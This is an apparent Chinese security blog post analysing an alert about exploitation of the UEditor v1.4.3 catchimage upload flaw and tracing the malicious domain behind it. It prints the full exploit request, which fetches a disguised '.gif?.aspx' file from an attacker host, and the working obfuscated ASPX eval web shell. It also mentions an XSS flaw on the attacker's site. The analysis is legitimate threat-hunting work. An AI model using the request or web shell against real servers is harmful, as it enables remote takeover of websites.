ailx10说：这篇是我2024年4月写的。UEditor 的老上传链前面已经见过，这次告警又出现相似图片地址，我反而对域名起了兴趣，想知道同款文件为什么换了个地方继续出现。顺着地址和相关查询页面往外走，发现样本和站点之间的关联比一条请求复杂，自己也冒出一些猜测。于是这篇就成了前一轮复现之后的继续追踪，重点不再只是漏洞怎么跑，而是围着一个线索往外看还能找到什么。那些个人怀疑我也留着，让后续能分清当时看见的和当时想到的。

---

最近分析告警，又发现了UEditor v1.4.3文件上传漏洞利用，对这个域名比较感兴趣，载荷如下

![](/notes-assets/080ce79610d7b54369f4.webp)

```
POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1



source[]=http://muma.xiaojiu9.cc/dedecms/ppxshell.gif?.aspx
```

跟踪source\[\]的链接，得到GBK编码的小马：

```
<% function ENW350v2(){var GEPH="unsa",YACK="fe",CA8A=GEPH+YACK;return CA8A;}var PAY:String=Request["xise"];~eval/*ZrUKBYe95A*/(PAY,ENW350v2());%><%@Page Language=JS%>

getshell成功
```

![](/notes-assets/0449ddd303efc7e0a82e.webp)

和上次的手法一模一样，一个字都没有改：ailx10：又抓到一个图片马（UEditor）

可以对比，上次的威胁载荷，一模一样：

```
source[]=http://www.o64.cc/dedecms/ppxshell.gif?.aspx



<% function ENW350v2(){var GEPH="unsa",YACK="fe",CA8A=GEPH+YACK;return CA8A;}var PAY:String=Request["xise"];~eval/*ZrUKBYe95A*/(PAY,ENW350v2());%><%@Page Language=JS%>
```

跟踪这个恶意域名，发现是一个境外网站（美国），2024年3月7日刚刚注册的，有效期1年

![](/notes-assets/37bb5c48bba956c5ffec.webp)

打开域名网站，需要注册，登录后发现是一个信息查询系统，截止今天总共71万数据

![](/notes-assets/56d1433826f9e33f1a1f.webp)

尝试查询张三，可以模糊匹配到很多信息，貌似都是和教育机构相关的，涉及地理范围很大

![](/notes-assets/c78e8309754b03679ff8.webp)

![](/notes-assets/fd275abe9af3c13fbbfd.webp)

测试了无SQL注入漏洞，但是发现站点存在XSS漏洞，我怀疑站长是一个黑客，因为域名`muma.xiaojiu9.cc`不是一个好人啊

![](/notes-assets/b6e968c9b32f0adcde74.webp)

同一段代码可以被许多人复用，域名名字也不是结论。能确定的就留下证据，暂时不能确定的就留个问题，这条追踪链以后才经得起回看。
